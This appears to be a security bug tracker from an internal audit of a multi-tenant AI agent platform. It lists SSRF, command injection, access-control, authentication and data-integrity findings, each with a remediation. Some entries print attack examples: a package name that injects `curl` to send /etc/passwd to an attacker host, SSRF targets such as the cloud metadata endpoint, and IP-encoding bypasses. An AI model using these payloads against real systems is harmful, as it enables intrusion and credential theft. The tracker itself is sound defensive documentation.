# Tsushin Bug Tracker
**Open:** 16 | **In Progress:** 0 | **Resolved:** 83
**Source:** v0.6.1 RBAC & Multi-Tenancy Audit + Security Vulnerability Audit + GKE Readiness Audit (2026-03-28)

## Open Issues

### BUG-065: SSRF via ollama_base_url — zero URL validation on user-controlled endpoint
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Critical
- **Category:** Server-Side Request Forgery (CWE-918)
- **Found:** 2026-03-28 (URL Rebase security design review)
- **File:** `backend/schemas.py:72`, `backend/api/routes.py:151-188`, `backend/agent/ai_client.py:396`
- **Description:** `ConfigUpdate` schema accepts `ollama_base_url: Optional[str]` with no format, scheme, or network restriction validation. `PUT /api/config` blindly calls `setattr(config, key, value)`. The stored URL is passed directly to `httpx.AsyncClient` at `ai_client.py:396`: `response = await self.client.post(f"{self.ollama_base_url}/api/chat", json=payload)`. The same unvalidated URL is also used in the Ollama health-check at `routes_api_keys.py:465`. Any `org.settings.write` user can set this to `http://postgres:5432`, `http://169.254.169.254/latest/meta-data/`, `http://host.docker.internal:8081/api/admin/`, or any internal service.
- **Impact:** Full SSRF from any tenant user with `org.settings.write`. Can reach PostgreSQL, cloud metadata (IAM credential theft on AWS/GCP), Docker host, Kokoro TTS, and the backend itself on the shared Docker network.
- **Remediation:** Add a Pydantic field validator on `ConfigUpdate.ollama_base_url` that: (1) parses with `urllib.parse.urlparse`, (2) enforces `http`/`https` scheme, (3) resolves hostname via `socket.getaddrinfo`, (4) rejects resolved IPs in RFC1918, loopback, link-local, and cloud metadata ranges using Python `ipaddress` stdlib. Implement as a reusable `ssrf_validator.py` module. **Blocks:** v0.7.0 OpenAI URL Rebase feature.

### BUG-066: Scraper and Playwright SSRF blocklists bypassable via DNS rebinding
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Critical
- **Category:** Server-Side Request Forgery (CWE-918)
- **Found:** 2026-03-28 (URL Rebase security design review)
- **File:** `backend/agent/tools/scraper_tool.py:90-95`, `backend/hub/providers/mcp_browser_provider.py`
- **Description:** `ScraperTool._is_safe_url()` uses string prefix matching on the raw hostname (`hostname.startswith('192.168.')`, `hostname.startswith('10.')`, `hostname.startswith('172.')`) without DNS resolution. An attacker who controls a public DNS record can bypass this with DNS rebinding: configure `attacker.com` to resolve to `10.0.0.1` after the string check passes. Additional bypass vectors: hex-encoded IPs (`0x0a.0.0.1`), decimal IPs (`2130706433` = 127.0.0.1), Docker service names (`postgres`, `kokoro-tts`), IPv6 (`[::]`). The `172.` prefix check is also incorrect — it blocks the entire `172.0.0.0/8` (includes public IPs) while the RFC1918 range is only `172.16.0.0/12`. The `mcp_browser_provider.py` `_validate_url` has the same DNS-resolution gap. Neither blocklist includes `169.254.169.254` (cloud metadata).
- **Impact:** SSRF through scraper and browser automation tools can reach internal services, cloud metadata endpoints, and Docker network services.
- **Remediation:** Replace string prefix checks with post-DNS-resolution IP validation using Python `ipaddress.ip_address(resolved_ip).is_private`, `.is_loopback`, `.is_link_local`, plus explicit `169.254.169.254` / `fd00:ec2::254` checks. Use the same `ssrf_validator.py` module from BUG-065 remediation.

### BUG-067: Config table is global singleton — ollama_base_url affects all tenants
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** High
- **Category:** Broken Access Control / Multi-Tenancy Isolation (CWE-284)
- **Found:** 2026-03-28 (URL Rebase security design review)
- **File:** `backend/models.py:9-96`, `backend/api/routes.py:151-188`
- **Description:** The `Config` table has no `tenant_id` column — it is a singleton retrieved via `db.query(Config).first()`. The `ollama_base_url` stored there applies globally to all tenants. A tenant user with `org.settings.write` permission who calls `PUT /api/config` can set `ollama_base_url` to an attacker-controlled endpoint, causing all other tenants' Ollama inference calls to route through the attacker's server. This enables prompt/completion exfiltration and response manipulation across tenant boundaries.
- **Impact:** Cross-tenant data exfiltration. One tenant can intercept all other tenants' Ollama AI traffic (prompts and responses).
- **Remediation:** Move `ollama_base_url` (and any future provider URL fields) to per-tenant storage. The planned `provider_instance` table (v0.7.0) addresses this by storing base URLs scoped to `tenant_id`. As an interim fix, add tenant_id scoping to the Ollama URL config or restrict `PUT /api/config` for URL fields to global admin only.

### BUG-068: Sentinel SSRF detection only covers 2 tool names — misses provider URL paths
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Medium
- **Category:** Insufficient Security Controls (CWE-693)
- **Found:** 2026-03-28 (URL Rebase security design review)
- **File:** `backend/services/sentinel_service.py:520-540`
- **Description:** Sentinel's SSRF check only triggers when `tool_name in ["browser_navigate", "scrape_webpage"]` and uses an incomplete string pattern list (misses `10.`, `192.168.`, `::1`, `fd00:ec2::254`, Docker service names). The provider URL Rebase feature stores base URLs in DB config, not as tool-call arguments — Sentinel will never see or validate these URLs. Additionally, the pattern list missing common private ranges means even the covered tools have gaps.
- **Impact:** Sentinel provides no protection against SSRF via provider URL configuration. The security agent is blind to this attack vector.
- **Remediation:** (1) Extend Sentinel's sensitive pattern list to include all RFC1918 ranges, IPv6 private ranges, and Docker service names. (2) For the URL Rebase feature, SSRF protection must be implemented at the service layer (`ssrf_validator.py`) rather than relying on Sentinel, since URLs are stored in DB config, not passed as tool arguments. Sentinel should remain as a defense-in-depth layer, not the primary control.

### BUG-063: Command injection in toolbox install_package via unsanitized package_name
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Critical
- **Category:** Command Injection (CWE-78)
- **Found:** 2026-03-28 (GKE readiness security review)
- **File:** `backend/services/toolbox_container_service.py:685-697`
- **Description:** `install_package()` passes `package_name` directly into `sh -c "pip install --user {package_name}"` and `sh -c "apt-get install -y {package_name}"` without sanitization. While execution is inside the tenant's sandboxed container, the `apt-get` path runs as root. A malicious package name like `curl && curl http://attacker/$(cat /etc/passwd)` would execute arbitrary commands as root inside the container.
- **Impact:** Root-level command execution inside tenant container. Although sandboxed, could be used for container escape attempts.
- **Remediation:** Validate `package_name` against strict regex `^[a-zA-Z0-9._-]+(==[\d.]+)?$` before building the command, or use list-style exec (`cmd=["pip", "install", "--user", package_name]`) to bypass shell interpretation entirely.

### BUG-064: Workspace directories created with 0o777 permissions
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Medium
- **Category:** Insecure File Permissions (CWE-732)
- **Found:** 2026-03-28 (GKE readiness security review)
- **File:** `backend/services/toolbox_container_service.py:62-78, 217-220`
- **Description:** `_get_workspace_path()` sets `0o777` on both base and tenant workspace directories. `_fix_workspace_permissions()` also runs `chmod 777 /workspace` as root inside containers on every start. World-writable directories mean any process with volume access could read/modify another tenant's workspace in misconfigured Docker-in-Docker setups.
- **Impact:** Potential cross-tenant workspace access in shared volume scenarios.
- **Remediation:** Replace `0o777` with `0o750` and ensure `chown toolbox:toolbox /workspace` is used instead of `chmod 777`.

### BUG-069: REGRESSION — Cross-tenant default agent operations (internal API)
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Critical
- **Category:** Broken Object Level Authorization / Cross-Tenant Data Corruption (CWE-284)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **Regression of:** BUG-032, BUG-033 (fixed in v1 API but not internal API)
- **File:** `backend/api/routes_agents.py:635-637` (create), `backend/api/routes_agents.py:726-728` (update), `backend/api/routes_agents.py:763-771` (delete)
- **Description:** Three cross-tenant isolation failures in the internal agent CRUD routes (not the v1 API, which is correctly scoped):
  1. **Create** (line 637): `db.query(Agent).update({"is_default": False})` — clears `is_default` on ALL agents across ALL tenants when any user creates a default agent.
  2. **Update** (line 728): `db.query(Agent).filter(Agent.id != agent_id).update({"is_default": False})` — same cross-tenant clearing on update.
  3. **Delete** (lines 763-771): `db.query(Agent).count()` counts all tenants; `db.query(Agent).filter(Agent.id != agent_id).first()` promotes an agent from ANY tenant as the new default.
- **Impact:** Any authenticated user with `agents.write` can silently corrupt every other tenant's default agent configuration. The delete path can promote a completely foreign tenant's agent as default, causing messages to be processed by the wrong agent.
- **Remediation:** Add `Agent.tenant_id == ctx.tenant_id` filter to all three queries. The v1 API routes (`v1/routes_agents.py:365`) already have the correct pattern.

### BUG-070: API client custom scope allows privilege escalation beyond creator's permissions
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Critical
- **Category:** Privilege Escalation (CWE-269)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/services/api_client_service.py:95-100`
- **Description:** When creating an API client with role `custom` or any predefined role (`api_admin`, `api_owner`), the service validates that each scope is a known permission name but does NOT check that the creating user actually holds those permissions. A `member` user (who lacks `agents.delete`, `users.manage`, `org.settings.write`, etc.) can create an `api_owner`-scoped API client that grants permissions the creator does not possess. The API client can then perform operations the human user cannot.
- **Impact:** Full privilege escalation. A `member` can create an API client with `org.settings.write` to trigger emergency stop, `agents.delete` to delete agents, or any other permission they lack.
- **Remediation:** Validate that `custom_scopes` (or the predefined role's scopes) are a subset of the creating user's own permissions. Alternatively, restrict `api_admin`/`api_owner` client creation to `owner` role users only.

### BUG-071: Password reset tokens stored in plaintext in database
- **Status:** Resolved
- **Resolved:** 2026-03-28
- **Severity:** Critical
- **Category:** Sensitive Data Exposure (CWE-312)
- **Found:** 2026-03-28 (Security Vulnerability Audit)
- **File:** `backend/models_rbac.py:165-177`, `backend/auth_service.py:195-206`
- **Description:** Password reset tokens are stored verbatim in the `PasswordResetToken` table: `token = Column(String(255), unique=True, nullable=False, index=True)`. The `generate_reset_token()` output is stored directly without hashing. The same pattern exists for `UserInvitation.invitation_token`. If the database is compromised (SQL injection, backup leak, or unauthorized DB access), an attacker obtains ready-to-use account takeover tokens for every pending reset/invitation.
- **Proof:** `reset_token = PasswordResetToken(user_id=user.id, token=token, expires_at=expires_at)` — raw token stored.
- **Impact:** Full account takeover for any user with a pending password reset or invitation token.
- **Remediation:** Store `sha256(token)` in the database. On lookup, hash the submitted token and compare. This is the same pattern already used for API client secrets (`ApiClientService.create_client()` uses Argon2 hashing).

### BUG-072: Soft-deleted users can still authenticate
- **Status:** Open
- **Severity:** Critical
- **Category:** Broken Authentication (CWE-287)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/auth_service.py:50`, `backend/auth_service.py:280`
- **Description:** The login flow at `auth_service.py:50` queries `db.query(User).filter(User.email == email).first()` without filtering `deleted_at.is_(None)`. A soft-deleted user retains their password hash and can successfully authenticate, receiving a valid JWT token. Similarly, `get_user_by_id` at line 280 lacks a `deleted_at` filter. The `is_active` check exists but `deleted_at` is a separate flag — a user can be deleted but still have `is_active=True` if the deletion path didn't deactivate them.
- **Impact:** Deleted users retain full system access until their JWT expires. Violates the assumption that user deletion revokes access.
- **Remediation:** Add `.filter(User.deleted_at.is_(None))` to the login query and `get_user_by_id`.

### BUG-073: SSO user password login causes unhandled 500 error
- **Status:** Open
- **Severity:** High
- **Category:** Error Handling / Denial of Service (CWE-755)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/auth_utils.py:66-70`, `backend/auth_service.py:56`
- **Description:** SSO-provisioned users have `password_hash = None`. When such a user attempts password-based login, `verify_password(password, None)` is called. The `except VerifyMismatchError` handler catches incorrect passwords, but when the hash is `None`, Argon2 raises `InvalidHashError` or `TypeError` which is NOT caught, resulting in an unhandled 500 error returned to the client.
- **Impact:** Information disclosure (reveals the user exists and was created via SSO). Also causes noisy 500 errors in monitoring.
- **Remediation:** Add a `None` check before calling `verify_password`: `if not user.password_hash: raise HTTPException(401, "Invalid credentials")`. Or catch the broader `argon2.exceptions.VerificationError` base class.

### BUG-074: Wildcard trusted proxy enables rate limit bypass via IP spoofing
- **Status:** Open
- **Severity:** High
- **Category:** Rate Limiting Bypass (CWE-799)
- **Found:** 2026-03-28 (Security Vulnerability Audit)
- **File:** `backend/app.py:930`
- **Description:** `app.add_middleware(ProxyHeadersMiddleware, trusted_hosts=["*"])` trusts `X-Forwarded-For` headers from any source. An unauthenticated attacker can spoof their IP by sending any `X-Forwarded-For` value, causing `get_remote_address()` to return the spoofed IP. All IP-based rate limits — login (`5/minute`), signup (`3/hour`), password reset (`3/hour`), setup wizard (`3/hour`) — are trivially bypassable by rotating this header.
- **Impact:** Unlimited brute-force attempts on authentication endpoints.
- **Remediation:** Set `trusted_hosts` to the specific upstream reverse proxy IP (e.g., Caddy/Nginx IP or Docker network CIDR), not `["*"]`.

### BUG-075: Sentinel logs, stats, and agent-config endpoints missing permission checks
- **Status:** Open
- **Severity:** High
- **Category:** Broken Access Control (CWE-862)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/api/routes_sentinel.py:452` (agent config), `backend/api/routes_sentinel.py:566` (logs), `backend/api/routes_sentinel.py:615` (stats)
- **Description:** These three endpoints only depend on `get_tenant_context` (which provides authentication) but have no `require_permission()` dependency. Any authenticated user in any role (including `readonly`) can access security audit logs, sentinel statistics, and per-agent sentinel configuration. Compare with `GET /sentinel/config` which correctly requires `org.settings.read`.
- **Impact:** `readonly` and `member` users can read sensitive security logs containing blocked prompts, tool abuse attempts, and SSRF detections. Information disclosure of security posture to low-privilege users.
- **Remediation:** Add `require_permission("org.settings.read")` or `require_permission("audit.read")` dependency to all three endpoints.

### BUG-076: Duplicate get_current_user bypasses is_active check
- **Status:** Open
- **Severity:** High
- **Category:** Broken Authentication (CWE-287)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/auth_routes.py:113` vs `backend/auth_dependencies.py:54`
- **Description:** Two separate `get_current_user` functions exist. `auth_dependencies.py:54` (`get_current_user_required`) checks `user.is_active` and raises 401 for disabled accounts. `auth_routes.py:113` (`get_current_user`) does NOT check `is_active`. The `auth_routes.py` version is used for `/api/auth/me` (line 600) and `/api/auth/logout` (line 624), meaning a disabled/deactivated user account can still call these endpoints with a valid JWT.
- **Impact:** Deactivated accounts can probe their own status via `/api/auth/me` and confirm their credentials are still valid. Low direct risk but violates the deactivation contract.
- **Remediation:** Add `is_active` check to `auth_routes.py`'s `get_current_user`, or consolidate to a single function.

### BUG-077: Hub Shell page has no frontend permission gate
- **Status:** Open
- **Severity:** High
- **Category:** Broken Access Control — Frontend (CWE-862)
- **Found:** 2026-03-28 (Frontend RBAC Audit)
- **File:** `frontend/app/hub/shell/page.tsx`
- **Description:** The Hub Shell page imports `hasPermission` (line 102) but never calls it. Any authenticated user, including `readonly` role, can navigate to `/hub/shell` and access the shell integration management UI. While backend endpoints enforce permissions, the UI exposes sensitive shell configuration and management interface to all users.
- **Impact:** Information disclosure of shell integration configuration. Users see management UI they shouldn't have access to, creating confusion and social engineering opportunities.
- **Remediation:** Add `hasPermission('shell.read')` gate with an Access Denied fallback block, or use the existing `PermissionGate` component.

### BUG-078: Hub Sandboxed Tools page has no frontend permission gate
- **Status:** Open
- **Severity:** High
- **Category:** Broken Access Control — Frontend (CWE-862)
- **Found:** 2026-03-28 (Frontend RBAC Audit)
- **File:** `frontend/app/hub/sandboxed-tools/page.tsx`
- **Description:** The Sandboxed Tools management page only checks for user presence (`useAuth`), with no permission check at all. Any authenticated user can navigate to `/hub/sandboxed-tools` and see the full tool management interface including create, edit, and delete operations. Backend enforces `tools.manage` permission, but the UI should not expose the management interface to unauthorized users.
- **Impact:** UI-level broken access control. `readonly` and `member` users see tool management interface they cannot use (backend blocks mutations), but can view all tool configuration data.
- **Remediation:** Add `hasPermission('tools.manage')` or `hasPermission('tools.read')` gate with Access Denied fallback.

### BUG-079: Five sensitive settings pages accessible to any authenticated user
- **Status:** Open
- **Severity:** High
- **Category:** Broken Access Control — Frontend (CWE-862)
- **Found:** 2026-03-28 (Frontend RBAC Audit)
- **File:** `frontend/app/settings/sentinel/page.tsx`, `frontend/app/settings/security/page.tsx`, `frontend/app/settings/ai-configuration/page.tsx`, `frontend/app/settings/model-pricing/page.tsx`, `frontend/app/settings/integrations/page.tsx`
- **Description:** These five settings pages only use `useRequireAuth()` with a `canEdit` flag to disable edit buttons, but have NO Access Denied block and NO `hasPermission()` gate. Any authenticated user (including `readonly`) can navigate to these pages and view:
  - `/settings/sentinel` — full security agent configuration
  - `/settings/security` — SSO configuration and encryption settings
  - `/settings/ai-configuration` — AI provider configuration and API key status
  - `/settings/model-pricing` — pricing and cost data
  - `/settings/integrations` — integration API key configuration
  Compare with `/settings/team` which correctly checks `hasPermission('users.read')`.
- **Impact:** `readonly` and `member` users can view sensitive organizational configuration including security controls, SSO settings, AI provider details, and pricing data.
- **Remediation:** Add `hasPermission('org.settings.read')` gate with Access Denied block to all five pages, matching the pattern used in `/settings/api-clients`.

### BUG-080: Hard user delete fails with FK violation on PostgreSQL
- **Status:** Open
- **Severity:** High
- **Category:** Data Integrity / Broken Delete Flow (CWE-404)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/api/routes_global_users.py:536-540`
- **Description:** The hard delete path (`DELETE /api/admin/users/{user_id}?hard=true`) only deletes `UserRole` records before deleting the user. However, `UserInvitation.invited_by` and `GlobalAdminAuditLog.global_admin_id` both have FK constraints to the User table without `ON DELETE CASCADE`. The delete will fail with a PostgreSQL FK violation error for any user who has sent invitations or has audit log entries.
- **Impact:** Global admin cannot hard-delete users who have audit trails or invitation history. Results in 500 errors.
- **Remediation:** Either add `ON DELETE SET NULL` to the FK constraints, or delete related `UserInvitation` and `GlobalAdminAuditLog` records before deleting the user. Alternatively, restrict to soft-delete only.

### BUG-081: SSO config endpoint uses inverted logic for global admin tenant context
- **Status:** Open
- **Severity:** High
- **Category:** Broken Access Control (CWE-863)
- **Found:** 2026-03-28 (Security Vulnerability Audit)
- **File:** `backend/api/routes_sso_config.py:153`, `backend/api/routes_sso_config.py:198`
- **Description:** The SSO config endpoints use `tenant_id = current_user.tenant_id if current_user.is_global_admin else tenant_context.tenant_id`. This is inverted — it uses `current_user.tenant_id` when the user IS a global admin. Global admins may have `tenant_id = None`, causing a 400 error. Global admins WITH a tenant are scoped to their own tenant rather than using the standard `TenantContext` resolution.
- **Impact:** Global admins cannot manage SSO configuration for tenants they don't belong to. A global admin with an associated tenant will always see/modify their own tenant's SSO config regardless of intent.
- **Remediation:** Use `tenant_context.tenant_id` consistently (the standard pattern used in all other routes).

### BUG-082: Analytics includes NULL-tenant agents for all users
- **Status:** Open
- **Severity:** High
- **Category:** Information Disclosure / Multi-Tenancy Leakage (CWE-200)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/api/routes_analytics.py:59-65`
- **Description:** The `get_tenant_agent_ids()` helper uses `or_(Agent.tenant_id == ctx.tenant_id, Agent.tenant_id.is_(None))`. This includes agents with `tenant_id = NULL` (legacy or system agents) in every tenant's analytics results. All tenants see token usage and analytics data for NULL-tenant agents.
- **Impact:** Information disclosure — all tenants see system/legacy agent analytics data that doesn't belong to them.
- **Remediation:** Remove the `Agent.tenant_id.is_(None)` condition. If system agents need analytics visibility, make it global-admin only.

### BUG-083: conversation_search_service references non-existent Memory columns
- **Status:** Open
- **Severity:** High
- **Category:** Runtime Error / Dead Code (CWE-476)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/services/conversation_search_service.py:310-312`
- **Description:** The code references `Memory.tenant_id` and `Memory.user_id`, but the `Memory` model (`models.py:99-106`) has neither column. This would throw an `AttributeError` at runtime, meaning this code path is either untested, unreachable, or broken.
- **Impact:** If this code path is ever reached, it will crash with a 500 error. The Memory table also has no `tenant_id` column, meaning conversation search through this path has no tenant isolation on the Memory table.
- **Remediation:** Either add `tenant_id` and `user_id` columns to the Memory model, or rewrite the query to join through the Agent table for tenant isolation.

### BUG-084: RBAC migration seed out of sync — missing 9 permissions
- **Status:** Open
- **Severity:** Medium
- **Category:** Configuration Drift (CWE-1188)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/migrations/add_rbac_tables.py` vs `backend/db.py:80-146`
- **Description:** The migration seed script (`add_rbac_tables.py`) is missing 9 permissions that `db.py`'s `seed_rbac_defaults()` defines: `tools.manage`, `tools.execute`, `shell.read`, `shell.write`, `shell.execute`, `shell.approve`, `api_clients.read`, `api_clients.write`, `api_clients.delete`. The `ensure_rbac_permissions()` startup function compensates at runtime, but a fresh deployment using only migration scripts will have broken permission checks for tools, shell, and API client management.
- **Impact:** Fresh deployments relying on migrations alone will have incomplete RBAC — users cannot manage tools, shell, or API clients until the app starts and runs `ensure_rbac_permissions()`.
- **Remediation:** Sync the migration seed to include all permissions from `db.py`. Keep `ensure_rbac_permissions()` as an upgrade path.

### BUG-085: Blind setattr mass assignment pattern on agent update
- **Status:** Open
- **Severity:** Medium
- **Category:** Mass Assignment (CWE-915)
- **Found:** 2026-03-28 (Security Vulnerability Audit)
- **File:** `backend/api/routes_agents.py:731-733`
- **Description:** The agent update handler uses `for field, value in update_data.items(): setattr(db_agent, field, value)` to apply all fields from the Pydantic model. While current fields are safe, this pattern is fragile — adding any new column to both the Pydantic schema and SQLAlchemy model automatically makes it mass-assignable without code review. The `AgentUpdate` schema includes `is_active` and `is_default`, and `is_default=True` triggers the cross-tenant bug in BUG-069.
- **Impact:** Currently moderate. Future risk is high if sensitive columns are added to the model without updating the update logic.
- **Remediation:** Use an explicit allowlist of updatable fields instead of blind `setattr` loop.

### BUG-086: Password reset flow non-functional — no email delivery
- **Status:** Open
- **Severity:** Medium
- **Category:** Broken Functionality (CWE-440)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/auth_routes.py:563-568`
- **Description:** The password reset endpoint generates a token and stores it in the database, but never sends it to the user. The code contains only a `TODO: Send email` comment. Users who forget their password have no way to reset it without admin intervention.
- **Impact:** Users locked out of their accounts with no self-service recovery path. Increases admin burden.
- **Remediation:** Implement email delivery for password reset tokens, or provide an alternative self-service mechanism.

### BUG-087: No self-service profile update or password change endpoints
- **Status:** Open
- **Severity:** Medium
- **Category:** Missing Feature / Broken User Management
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/auth_routes.py`
- **Description:** There is no `PUT /api/auth/me` or similar endpoint. Users cannot update their own full name, change their password, or modify their email. The only way to change a password is via admin reset (`POST /api/admin/users/{id}/reset-password`) or the broken token-based flow (BUG-086). No self-service password change exists.
- **Impact:** Users depend entirely on admins for basic account operations. Major UX gap for a multi-tenant SaaS platform.
- **Remediation:** Implement `PUT /api/auth/me` for profile updates and `POST /api/auth/change-password` requiring current password verification.

### BUG-088: Tenant ID generation collision at second-precision timestamps
- **Status:** Open
- **Severity:** Medium
- **Category:** Data Integrity / Race Condition (CWE-362)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/auth_service.py:114`
- **Description:** Tenant IDs are generated using second-precision timestamps (e.g., `tenant_20240101120000`). Two concurrent signups within the same second will generate identical tenant IDs, causing a database unique constraint violation and a 500 error.
- **Impact:** Signup failures during high-concurrency periods. Low probability in current usage but will increase with scale.
- **Remediation:** Add microsecond precision or a random suffix (e.g., `tenant_20240101120000_a3f2b9`) to ensure uniqueness. Alternatively, use UUID-based tenant IDs.

### BUG-089: Flow template validate/render endpoints lack permission check
- **Status:** Open
- **Severity:** Medium
- **Category:** Broken Access Control (CWE-862)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/api/routes_flows.py:296-350`
- **Description:** `GET /api/flows/template/validate` and `GET /api/flows/template/render` only require `get_current_user_required` without any `require_permission("flows.read")` or `require_permission("flows.write")` check. Any authenticated user (including `readonly`) can call these utility endpoints.
- **Impact:** Low — these endpoints only validate/render templates without accessing actual flow data. But inconsistent with other flow endpoints that require `flows.read`.
- **Remediation:** Add `require_permission("flows.read")` for consistency.

### BUG-090: No audit logging for tenant-level role changes
- **Status:** Open
- **Severity:** Medium
- **Category:** Insufficient Logging (CWE-778)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/api/routes_team.py:484-569`
- **Description:** The `change_member_role` endpoint does not call `log_admin_action()` or any audit mechanism. Global admin actions are audited in `GlobalAdminAuditLog`, but tenant-level role changes (e.g., promoting member to admin, demoting admin to member) are not logged anywhere. This creates a gap in the audit trail for privilege changes.
- **Impact:** No accountability for role changes within a tenant. A compromised admin could escalate privileges for a collaborator with no audit trail.
- **Remediation:** Add audit logging for all role changes in `routes_team.py`, either to an existing audit table or a new tenant-level audit log.

### BUG-091: Global email uniqueness blocks re-registration after soft delete
- **Status:** Open
- **Severity:** Medium
- **Category:** Data Integrity / Design Flaw (CWE-1289)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/models_rbac.py:48`
- **Description:** The `User` model has a global unique constraint on `email`. When a user is soft-deleted (sets `deleted_at`), their email remains claimed. No new account can be created with that email address. This blocks legitimate re-registration after account deletion and prevents the same email from joining a different tenant after leaving the original.
- **Impact:** Users whose accounts are soft-deleted are permanently locked out of the platform with no way to re-register.
- **Remediation:** Either make the unique constraint a partial index on `deleted_at IS NULL`, or append a suffix to deleted users' emails (e.g., `user@example.com` → `user@example.com.deleted.{timestamp}`).

### BUG-092: Missing HSTS security header
- **Status:** Open
- **Severity:** Medium
- **Category:** Transport Security (CWE-319)
- **Found:** 2026-03-28 (Security Vulnerability Audit)
- **File:** `backend/app.py:944-962`
- **Description:** The security headers middleware adds `X-Frame-Options`, `X-Content-Type-Options`, `X-XSS-Protection`, `Referrer-Policy`, `Permissions-Policy`, and `Content-Security-Policy`, but omits `Strict-Transport-Security` (HSTS). Without HSTS, a first-visit MITM attacker can downgrade HTTPS connections to HTTP.
- **Impact:** SSL stripping attacks on first visit for production deployments behind TLS.
- **Remediation:** Add `response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload"` (conditionally, only when deployed behind TLS).

### BUG-093: PermissionGate component and matchesPermission() are dead code
- **Status:** Open
- **Severity:** Low
- **Category:** Dead Code / Technical Debt
- **Found:** 2026-03-28 (Frontend RBAC Audit)
- **File:** `frontend/components/rbac/PermissionGate.tsx`, `frontend/lib/rbac/permissions.ts:69-84`
- **Description:** `PermissionGate` is a well-implemented permission-gating component that is defined but imported in zero pages. `matchesPermission()` in `permissions.ts` supports wildcard expansion (`agents.*` matches `agents.read`) but is never used — `AuthContext.checkPermission` uses a plain `Array.includes()` instead. Both represent investment in RBAC infrastructure that was never integrated.
- **Impact:** No direct impact. Missed opportunity to use existing infrastructure for the permission gates missing in BUG-077, BUG-078, BUG-079.
- **Remediation:** Either integrate `PermissionGate` into pages that need permission gating, or remove the dead code.

### BUG-094: Settings audit-logs and team member detail pages use mock data
- **Status:** Open
- **Severity:** Low
- **Category:** Incomplete Implementation
- **Found:** 2026-03-28 (Frontend RBAC Audit)
- **File:** `frontend/app/settings/audit-logs/page.tsx`, `frontend/app/settings/team/[id]/page.tsx`
- **Description:** `/settings/audit-logs` uses `MOCK_LOGS` — hardcoded fake audit log entries instead of fetching from `GET /api/admin/audit-logs`. `/settings/team/[id]` uses `MOCK_USER` — always displays the same fake user data regardless of the URL parameter. Both pages are functional stubs that mislead users into thinking they're seeing real data.
- **Impact:** Users see fake data presented as real. Audit log page provides false security assurance.
- **Remediation:** Connect both pages to their respective backend API endpoints.

### BUG-095: Inconsistent 403/401 error handling across frontend API methods
- **Status:** Open
- **Severity:** Low
- **Category:** Error Handling (CWE-755)
- **Found:** 2026-03-28 (Frontend RBAC Audit)
- **File:** `frontend/lib/client.ts`
- **Description:** Only 32 of the API methods use `handleApiError()` which provides specific messages for 401/403/404. The majority of API calls use inline `throw new Error('Failed to ...')` which does not distinguish permission denials from other errors. When a 401 (expired session) occurs on these calls, the user sees a generic error instead of being redirected to login.
- **Impact:** Poor user experience on session expiry and permission denials. Users see cryptic error messages instead of actionable feedback.
- **Remediation:** Apply `handleApiError` consistently across all API methods, or add a global fetch interceptor that handles 401/403 uniformly.

### BUG-096: Stale JWT role/tenant claims not revalidated after changes
- **Status:** Open
- **Severity:** Low
- **Category:** Session Management (CWE-613)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/auth_utils.py:73-97`
- **Description:** JWT tokens embed `tenant_id` and `role` claims at creation time. If an admin changes a user's role or a user is transferred to a different tenant, the embedded claims become stale. The backend mitigates this by re-reading the user from the database on every request (via `get_current_user_required`), but: (1) the frontend displays the stale role from the JWT, (2) any code path that reads claims directly from the token payload rather than the user object will use stale data.
- **Impact:** Low — backend isolation is correct. Frontend may display incorrect role label until re-login.
- **Remediation:** Force token refresh after role/tenant changes. Or add a `role_version` counter that invalidates tokens on role change.

### BUG-097: rbac_middleware.py decorator functions are unused dead code
- **Status:** Open
- **Severity:** Low
- **Category:** Dead Code / Technical Debt
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/rbac_middleware.py`
- **Description:** The decorator-style RBAC functions (`require_permission`, `require_any_permission`, `require_all_permissions`) in `rbac_middleware.py` are never used by any route handler. All actual RBAC enforcement uses the FastAPI dependency injection pattern from `auth_dependencies.py`. The file creates confusion about which permission system is canonical.
- **Impact:** No security impact. Maintenance confusion and potential for developers to use the wrong permission system.
- **Remediation:** Remove the unused decorator functions or add deprecation warnings. Document `auth_dependencies.py` as the canonical pattern.

### BUG-098: Tenant user limit check has race condition on concurrent invites
- **Status:** Open
- **Severity:** Low
- **Category:** Race Condition (CWE-362)
- **Found:** 2026-03-28 (RBAC & Multi-Tenancy Audit)
- **File:** `backend/api/routes_team.py:317-333`
- **Description:** The tenant user limit check (`current_count < tenant.max_users`) is not protected by a database-level lock. Two concurrent invitation requests can both pass the limit check and both succeed, exceeding the tenant's user limit.
- **Impact:** Tenant can exceed their plan's user limit. Low severity since invitation acceptance is a separate step that could add a second check.
